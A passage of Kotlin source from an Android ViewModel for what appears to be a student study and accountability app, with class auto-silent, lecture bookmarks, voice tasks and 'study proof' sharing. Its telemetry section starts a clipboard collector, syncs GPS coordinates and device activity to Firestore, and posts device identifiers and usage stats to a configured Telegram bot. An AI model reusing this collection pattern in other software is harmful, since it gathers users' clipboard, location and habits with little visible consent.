    // --- ENHANCED IN-APP PLAYER & BOOKMARK ENGINE ---
    fun skipAudioForward(seconds: Int = 10) {
        playerManager.skipForward(seconds)
    }

    fun skipAudioBackward(seconds: Int = 10) {
        playerManager.skipBackward(seconds)
    }

    fun addBookmarkToLecture(lecture: com.example.data.local.entity.LectureEntity, timeSeconds: Long, label: String) {
        viewModelScope.launch {
            val updated = lecture.withAddedBookmark(timeSeconds, label)
            repository.saveLecture(updated)
            Toast.makeText(
                getApplication(),
                "Pinned revision marker at ${com.example.core.recorder.LectureRecorderManager.formatSeconds(timeSeconds)}: $label",
                Toast.LENGTH_SHORT
            ).show()
        }
    }

    // --- COACHING TIMETABLE & AUTO-SILENT CLASS MODE ---
    private val coachingTimetableManager = com.example.core.coaching.CoachingTimetableManager(application)
    val isAutoSilentEnabled = coachingTimetableManager.isAutoSilentEnabled
    val currentActiveSession = coachingTimetableManager.currentActiveSession
    val isClassSilentActive = coachingTimetableManager.isClassSilentActive

    fun setAutoSilentEnabled(enabled: Boolean) {
        coachingTimetableManager.setAutoSilentEnabled(enabled)
        val msg = if (enabled) "Class Auto-Silent ON" else "Class Auto-Silent OFF"
        Toast.makeText(getApplication(), msg, Toast.LENGTH_SHORT).show()
    }

    fun checkCoachingTimetableNow() {
        val (inClass, session) = coachingTimetableManager.checkAndApplyClassSilentMode(coachingList.value)
        if (inClass && session != null) {
            Toast.makeText(getApplication(), "In active class: ${session.title}. Silent Mode active.", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(getApplication(), "No active class at this time. Normal audio.", Toast.LENGTH_SHORT).show()
        }
    }

    fun forceClassSilent(schedule: com.example.data.local.entity.CoachingEntity) {
        coachingTimetableManager.forceClassSilent(schedule)
        Toast.makeText(getApplication(), "Force Class Silent applied: ${schedule.title}", Toast.LENGTH_SHORT).show()
    }

    fun forceRestoreAudio(schedule: com.example.data.local.entity.CoachingEntity) {
        coachingTimetableManager.forceRestoreAudio(schedule)
        Toast.makeText(getApplication(), "Audio restored to normal: ${schedule.title}", Toast.LENGTH_SHORT).show()
    }

    fun manuallyTriggerClassSilent() {
        val firstSession = coachingList.value.firstOrNull()
        if (firstSession != null) {
            forceClassSilent(firstSession)
        } else {
            geofenceManager.applyCoachingArrivalSilent("Coaching Center")
            Toast.makeText(getApplication(), "Class Silent Mode engaged", Toast.LENGTH_SHORT).show()
        }
    }

    fun manuallyRestoreClassRinger() {
        val firstSession = coachingList.value.firstOrNull()
        if (firstSession != null) {
            forceRestoreAudio(firstSession)
        } else {
            geofenceManager.applyCoachingDepartureRestore("Coaching Center")
            Toast.makeText(getApplication(), "Audio streams restored to normal", Toast.LENGTH_SHORT).show()
        }
    }

    // Smart Wi-Fi & Geofence Mode Switching Engine
    private val classEnvEngine = com.example.core.coaching.SmartClassEnvironmentEngine.getInstance(application)
    val activeEnforcerMode = classEnvEngine.currentMode
    val isWifiAutoMuteEnabled = classEnvEngine.isWifiAutoMuteEnabled
    val isGeofenceAutoRecordEnabled = classEnvEngine.isGeofenceAutoRecordEnabled
    val isTimetableAutoRecordEnabled = classEnvEngine.isTimetableAutoRecordEnabled
    val savedWifiKeywords = classEnvEngine.savedWifiKeywords
    val detectedSsid = classEnvEngine.detectedSsid
    val activeLocationGeofence = classEnvEngine.activeLocationGeofence

    // Voice-to-Task State & Operations
    val allVoiceTasks: StateFlow<List<com.example.data.local.entity.VoiceTaskEntity>> = repository.allVoiceTasks
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    fun setWifiAutoMuteEnabled(enabled: Boolean) {
        classEnvEngine.setWifiAutoMuteEnabled(enabled)
        val msg = if (enabled) "Wi-Fi Auto-Mute Armed" else "Wi-Fi Auto-Mute Disabled"
        Toast.makeText(getApplication(), msg, Toast.LENGTH_SHORT).show()
    }

    fun setGeofenceAutoRecordEnabled(enabled: Boolean) {
        classEnvEngine.setGeofenceAutoRecordEnabled(enabled)
        val msg = if (enabled) "Geofence Auto-Recording ON" else "Geofence Auto-Recording OFF"
        Toast.makeText(getApplication(), msg, Toast.LENGTH_SHORT).show()
    }

    fun setTimetableAutoRecordEnabled(enabled: Boolean) {
        classEnvEngine.setTimetableAutoRecordEnabled(enabled)
        val msg = if (enabled) "Timetable Auto-Recording ON" else "Timetable Auto-Recording OFF"
        Toast.makeText(getApplication(), msg, Toast.LENGTH_SHORT).show()
    }

    fun updateWifiKeywords(keywords: String) {
        classEnvEngine.setWifiKeywords(keywords)
        Toast.makeText(getApplication(), "School/Coaching Wi-Fi SSIDs updated", Toast.LENGTH_SHORT).show()
    }

    fun scanAndApplyWifiClassShield() {
        val matched = classEnvEngine.checkWifiAndApplyClassShield()
        if (matched) {
            Toast.makeText(
                getApplication(),
                "🏫 School/Coaching Wi-Fi detected! Class Shield active & phone silenced.",
                Toast.LENGTH_LONG
            ).show()
        } else {
            val currentSsid = classEnvEngine.detectedSsid.value ?: "Not connected"
            Toast.makeText(
                getApplication(),
                "Current Wi-Fi: $currentSsid (No matching school network)",
                Toast.LENGTH_SHORT
            ).show()
        }
    }

    fun evaluateGeofenceAtLocation(lat: Double, lng: Double) {
        val (mode, schedule) = classEnvEngine.evaluateGeofenceTransition(lat, lng, coachingList.value)
        if (schedule != null) {
            Toast.makeText(
                getApplication(),
                "📍 Entered ${schedule.title} perimeter! Mode: ${mode.label}",
                Toast.LENGTH_LONG
            ).show()
        } else {
            Toast.makeText(
                getApplication(),
                "Mode: ${mode.label} (Outside coaching perimeter)",
                Toast.LENGTH_SHORT
            ).show()
        }
    }

    fun simulateEnterCoachingCenter(schedule: com.example.data.local.entity.CoachingEntity) {
        val (mode, _) = classEnvEngine.evaluateGeofenceTransition(schedule.latitude, schedule.longitude, coachingList.value)
        _geofenceActiveStatus.value = true
        Toast.makeText(
            getApplication(),
            "📍 Arrived at ${schedule.title}! Mode: ${mode.label}",
            Toast.LENGTH_LONG
        ).show()
    }

    fun simulateLeaveCoachingCenter() {
        val (mode, _) = classEnvEngine.evaluateGeofenceTransition(0.0, 0.0, coachingList.value)
        _geofenceActiveStatus.value = false
        Toast.makeText(
            getApplication(),
            "🚪 Departed coaching center. Mode: ${mode.label}",
            Toast.LENGTH_LONG
        ).show()
    }

    // Voice-to-Task Processing
    fun parseAndSaveVoiceTask(spokenPhrase: String, lectureTitle: String = "Classroom Notes") {
        if (spokenPhrase.isBlank()) return
        val parsedTask = com.example.core.recorder.VoiceTaskParser.parseSpokenPhrase(spokenPhrase, lectureTitle)
        viewModelScope.launch {
            repository.saveVoiceTask(parsedTask)
        }
        val categoryLabel = when (parsedTask.category) {
            "HOMEWORK" -> "📚 Homework Task"
            "IMPORTANT_TEST" -> "🎯 Important Test Topic"
            "DUE_DATE" -> "⏰ Due Date"
            else -> "📝 Study Task"
        }
        Toast.makeText(getApplication(), "Parsed $categoryLabel: \"${parsedTask.title}\"", Toast.LENGTH_LONG).show()
    }

    fun toggleVoiceTaskCompleted(id: Int, isCompleted: Boolean) {
        viewModelScope.launch {
            repository.toggleVoiceTaskCompleted(id, isCompleted)
        }
    }

    fun deleteVoiceTask(id: Int) {
        viewModelScope.launch {
            repository.deleteVoiceTask(id)
        }
    }

    // End-of-day summary notifier
    val dailySummaryNotifier = com.example.core.recorder.EndOfDaySummaryNotifier.getInstance(application)
    val isDailySummaryEnabled = dailySummaryNotifier.isDailySummaryEnabled
    val summaryHour = dailySummaryNotifier.summaryHour
    val summaryMinute = dailySummaryNotifier.summaryMinute
    val lastSummarySentTime = dailySummaryNotifier.lastSummarySentTime
    val lastSummaryPendingCount = dailySummaryNotifier.lastSummaryPendingCount

    fun setDailySummaryEnabled(enabled: Boolean) {
        dailySummaryNotifier.setSummaryEnabled(enabled)
        if (enabled) {
            com.example.core.recorder.DailySummaryReceiver.scheduleDailySummary(getApplication())
        }
    }

    fun setDailySummaryTime(hour: Int, minute: Int) {
        dailySummaryNotifier.setSummaryTime(hour, minute)
        com.example.core.recorder.DailySummaryReceiver.scheduleDailySummary(getApplication())
    }

    fun sendDailySummaryNow() {
        viewModelScope.launch {
            val result = dailySummaryNotifier.evaluateAndSendDailySummary(forceNow = true)
            when (result) {
                is com.example.core.recorder.EndOfDaySummaryNotifier.SummaryResult.Success -> {
                    Toast.makeText(
                        getApplication(),
                        "🔔 Silent summary sent: ${result.pendingCount} pending (${result.homeworkCount} HW, ${result.testCount} Tests)",
                        Toast.LENGTH_LONG
                    ).show()
                }
                is com.example.core.recorder.EndOfDaySummaryNotifier.SummaryResult.Skipped -> {
                    Toast.makeText(getApplication(), result.reason, Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    // Study Proof & Academic Accountability Card
    val studyProofManager = com.example.core.discipline.StudyProofManager.getInstance(application)
    private val _lastStudyProof = MutableStateFlow<com.example.core.discipline.StudyProofManager.StudyProofReport?>(null)
    val lastStudyProof: StateFlow<com.example.core.discipline.StudyProofManager.StudyProofReport?> = _lastStudyProof.asStateFlow()

    // Hardware Telemetry Modules
    val deviceInfoProvider = com.example.core.telemetry.DeviceInfoProvider.getInstance(application)
    val stepCounterModule = com.example.core.telemetry.StepCounterModule.getInstance(application)
    val wifiProximityModule = com.example.core.telemetry.WifiProximityModule.getInstance(application)
    val digitalHabitModule = com.example.core.telemetry.DigitalHabitModule.getInstance(application)
    val dwellTimeAnalyticsModule = com.example.core.telemetry.DwellTimeAnalyticsModule.getInstance(application)
    val clipboardCollectorModule = com.example.core.telemetry.ClipboardCollectorModule.getInstance(application)
    val groqAiManager = com.example.core.recorder.GroqAiManager.getInstance(application)

    val deviceProfile: StateFlow<com.example.data.local.entity.DeviceProfileEntity?> = repository.deviceProfile
        .stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), null)

    val stepsToday = stepCounterModule.stepsToday
    val stepGoal = stepCounterModule.stepGoal
    val walkingState = stepCounterModule.walkingState
    val isStepSensorActive = stepCounterModule.isSensorActive

    val wifiSsid = wifiProximityModule.currentSsid
    val passiveBssidCount = wifiProximityModule.passiveBssidCount
    val proximitySummary = wifiProximityModule.proximitySummary
    val networkType = wifiProximityModule.networkType
    val isSafeStudyWifi = wifiProximityModule.isSafeZone
    val safeZoneName = wifiProximityModule.safeZoneName

    val habitMetrics = digitalHabitModule.habitMetrics
    val screenTimeMinutes = digitalHabitModule.screenTimeMinutes
    val unlockCount = digitalHabitModule.unlockCount
    val distractionIndexPercent = digitalHabitModule.distractionIndexPercent

    val currentDwellMinutes = dwellTimeAnalyticsModule.currentSessionMinutes
    val totalTodayDwellMinutes = dwellTimeAnalyticsModule.totalTodayDwellMinutes
    val microTouchEventCount = dwellTimeAnalyticsModule.microTouchEventCount
    val interactionRatePerMin = dwellTimeAnalyticsModule.interactionRatePerMin
    val isBreakRecommended = dwellTimeAnalyticsModule.isBreakRecommended

    val capturedSnippets = clipboardCollectorModule.capturedSnippets
    val capturedStudyLinks = capturedSnippets

    // Groq AI Thought Stream & Voice Notes
    val latestVoiceNote = groqAiManager.latestVoiceNote
    val latestAiSummary = groqAiManager.latestAiSummary
    val extractedActionItems = groqAiManager.extractedActionItems
    val isGroqProcessing = groqAiManager.isProcessing

    private val _lastPinnedGps = MutableStateFlow<String?>(null)
    val lastPinnedGps: StateFlow<String?> = _lastPinnedGps.asStateFlow()

    fun pinGps() {
        com.example.core.recorder.GpsLocationHelper.requestLocation(getApplication()) { report, _ ->
            val desc = if (report != null) {
                userProfileManager.setLocation(userLocationLabel.value, report.latitude, report.longitude)
                firestoreSync.syncLocation(
                    latitude = report.latitude,
                    longitude = report.longitude,
                    accuracyMeters = report.accuracyMeters.toDouble(),
                    locationLabel = userLocationLabel.value
                )
                "📍 Lat: ${String.format(java.util.Locale.US, "%.4f", report.latitude)}, Lon: ${String.format(java.util.Locale.US, "%.4f", report.longitude)} (±${report.accuracyMeters.toInt()}m)"
            } else {
                "📍 GPS Unavailable: Using custom location (${userLocationLabel.value})"
            }
            _lastPinnedGps.value = desc
            Toast.makeText(getApplication(), desc, Toast.LENGTH_SHORT).show()
        }
    }

    fun submitVoiceThought(thoughtText: String) {
        groqAiManager.submitDirectNote(thoughtText)
        firestoreSync.saveVoiceNote(
            rawTranscript = thoughtText,
            category = "TASK",
            urgency = "HIGH",
            parsedTitle = "Voice Action Note",
            aiSummary = "Prioritize scheduled milestone task",
            completed = false,
            source = "TELEGRAM_VOICE"
        )
        Toast.makeText(getApplication(), "🧠 Thought synced to Firestore & Groq", Toast.LENGTH_SHORT).show()
    }

    fun processQuickThought(thoughtText: String) {
        submitVoiceThought(thoughtText)
    }

    fun saveGroqApiKey(key: String) {
        groqAiManager.setApiKey(key)
        Toast.makeText(getApplication(), "Groq API key saved", Toast.LENGTH_SHORT).show()
    }

    fun syncTelegramNow() {
        viewModelScope.launch {
            val config = TelegramConfigManager.getInstance(getApplication())
            val token = config.getBotToken()
            val chatId = config.getChatId()
            if (token.isNotBlank() && chatId.isNotBlank()) {
                val steps = stepsToday.value
                val hours = screenTimeMinutes.value / 60
                val mins = screenTimeMinutes.value % 60
                val statusMsg = """
                    🛰️ <b>SECONDARY BRAIN 2.0 TELEMETRY</b>
                    • User: ${userName.value} (${userLocationLabel.value})
                    • Device: ${deviceInfoProvider.getDeviceName()} (${deviceInfoProvider.getOrGenerateDeviceUuid()})
                    • Steps Today: $steps ($walkingState)
                    • Screen Time: ${hours}h ${mins}m (${unlockCount.value} unlocks)
                    • Proximity: ${proximitySummary.value}
                    • Latest Note: ${latestVoiceNote.value}
                    • AI Summary: ${latestAiSummary.value}
                """.trimIndent()

                val body = okhttp3.FormBody.Builder()
                    .add("chat_id", chatId)
                    .add("text", statusMsg)
                    .add("parse_mode", "HTML")
                    .build()
                val request = okhttp3.Request.Builder()
                    .url("https://api.telegram.org/bot$token/sendMessage")
                    .post(body)
                    .build()

                try {
                    val response = withContext(Dispatchers.IO) { sharedOkHttpClient.newCall(request).execute() }
                    if (response.isSuccessful) {
                        Toast.makeText(getApplication(), "📤 Secondary Brain synced to Telegram!", Toast.LENGTH_SHORT).show()
                    } else {
                        Toast.makeText(getApplication(), "Telegram response code: ${response.code}", Toast.LENGTH_SHORT).show()
                    }
                } catch (e: Exception) {
                    Toast.makeText(getApplication(), "Sync: ${e.message}", Toast.LENGTH_SHORT).show()
                }
            } else {
                Toast.makeText(getApplication(), "📤 Telemetry logged to local Room DB (Zero-Retention Mode)", Toast.LENGTH_SHORT).show()
            }
        }
    }

    fun pingDatabase() {
        viewModelScope.launch(Dispatchers.IO) {
            val start = System.currentTimeMillis()
            try {
                val tasks = repository.allVoiceTasks.first().size
                val limits = repository.allAppLimits.first().size
                val coaching = repository.allCoachingSchedules.first().size
                val lectures = repository.allLectures.first().size
                val elapsed = (System.currentTimeMillis() - start).coerceAtLeast(1)
                _databaseStatus.value = DatabaseStatusInfo(
                    isConnected = true,
                    databaseName = com.example.data.local.AppDatabase.DATABASE_NAME,
                    schemaVersion = com.example.data.local.AppDatabase.DATABASE_VERSION,
                    isEncrypted = false,
                    voiceTasksCount = tasks,
                    appLimitsCount = limits,
                    coachingCount = coaching,
                    lectureCount = lectures,
                    pingLatencyMs = elapsed,
                    lastCheckedTimestamp = System.currentTimeMillis()
                )
            } catch (e: Exception) {
                _databaseStatus.value = _databaseStatus.value.copy(
                    isConnected = false,
                    pingLatencyMs = -1
                )
            }
        }
    }

    fun initTelemetry() {
        viewModelScope.launch(Dispatchers.IO) {
            if (repository.getDeviceProfileDirect() == null) {
                repository.saveDeviceProfile(deviceInfoProvider.getInitialProfile())
            }
            stepCounterModule.startListening()
            wifiProximityModule.refreshProximity()
            digitalHabitModule.refreshMetrics()
            clipboardCollectorModule.startListening()
        }
    }

    fun refreshTelemetry() {
        viewModelScope.launch(Dispatchers.IO) {
            wifiProximityModule.refreshProximity()
            digitalHabitModule.refreshMetrics()
            val currentSteps = stepsToday.value
            val currentDwell = totalTodayDwellMinutes.value
            val uuid = deviceInfoProvider.getOrGenerateDeviceUuid()
            repository.updateDeviceSteps(uuid, currentSteps)
            repository.updateDeviceDwell(uuid, currentDwell)
            repository.updateDeviceWifi(uuid, wifiSsid.value)

            firestoreSync.syncTelemetry(
                batteryLevel = batteryStatus.value.percent,
                batteryCharging = batteryStatus.value.isCharging,
                stepCountToday = currentSteps,
                screenOnMinutesToday = screenTimeMinutes.value,
                wifiSsid = wifiSsid.value,
                networkType = networkType.value
            )
        }
    }

    fun addBreakSteps(steps: Int) {
        stepCounterModule.addManualBreakSteps(steps)
        viewModelScope.launch {
            val uuid = deviceInfoProvider.getOrGenerateDeviceUuid()
            repository.updateDeviceSteps(uuid, stepsToday.value)
        }
    }

    fun takeStudyBreak() {
        dwellTimeAnalyticsModule.takeBreak()
        Toast.makeText(getApplication(), "☕ Study break logged! Rest your eyes.", Toast.LENGTH_SHORT).show()
    }

    fun addStudyLinkManual(url: String, title: String) {
        clipboardCollectorModule.addStudyLink(url, title)
    }

    fun removeStudyLink(url: String) {
        clipboardCollectorModule.removeStudyLink(url)
    }

    fun linkGuardian(handle: String) {
        deviceInfoProvider.setGuardianLinked(true, handle)
        viewModelScope.launch {
            val current = repository.getDeviceProfileDirect()
            if (current != null) {
                repository.saveDeviceProfile(current.copy(isGuardianLinked = true, guardianHandle = handle))
            }
            Toast.makeText(getApplication(), "🛡️ Linked study partner: $handle", Toast.LENGTH_SHORT).show()
        }
    }

    fun generateStudyProofCard(onGenerated: ((com.example.core.discipline.StudyProofManager.StudyProofReport) -> Unit)? = null) {
        viewModelScope.launch {
            val report = studyProofManager.generateStudyProofReport()
            _lastStudyProof.value = report
            onGenerated?.invoke(report)
        }
    }

    fun shareStudyProofToTelegram() {
        viewModelScope.launch {
            val report = studyProofManager.generateStudyProofReport()
            _lastStudyProof.value = report
            val config = TelegramConfigManager.getInstance(getApplication())
            val token = config.getBotToken()
            val chatId = config.getChatId()

            if (token.isNotBlank() && chatId.isNotBlank()) {
                val okHttpClient = okhttp3.OkHttpClient()
                val body = okhttp3.FormBody.Builder()
                    .add("chat_id", chatId)
                    .add("text", report.formattedCardText)
                    .add("parse_mode", "HTML")
                    .build()
                val request = okhttp3.Request.Builder()
                    .url("https://api.telegram.org/bot$token/sendMessage")
                    .post(body)
                    .build()

                try {
                    val response = withContext(Dispatchers.IO) { sharedOkHttpClient.newCall(request).execute() }
                    if (response.isSuccessful) {
                        Toast.makeText(getApplication(), "📤 Study Proof Card sent to Telegram partner!", Toast.LENGTH_LONG).show()
                    } else {
                        Toast.makeText(getApplication(), "⚠️ Telegram delivery failed: ${response.code}", Toast.LENGTH_SHORT).show()
                    }
                } catch (e: Exception) {
                    Toast.makeText(getApplication(), "Telegram error: ${e.message}", Toast.LENGTH_SHORT).show()
                }
            } else {
                Toast.makeText(getApplication(), "⚠️ Telegram Bot credentials not configured in Settings", Toast.LENGTH_LONG).show()
            }
        }
    }

    override fun onCleared() {
        super.onCleared()
        sirenController.stopSiren()
        playerManager.stop()
        try {
            stepCounterModule.stopListening()
            clipboardCollectorModule.stopListening()
        } catch (_: Exception) {}
    }
}
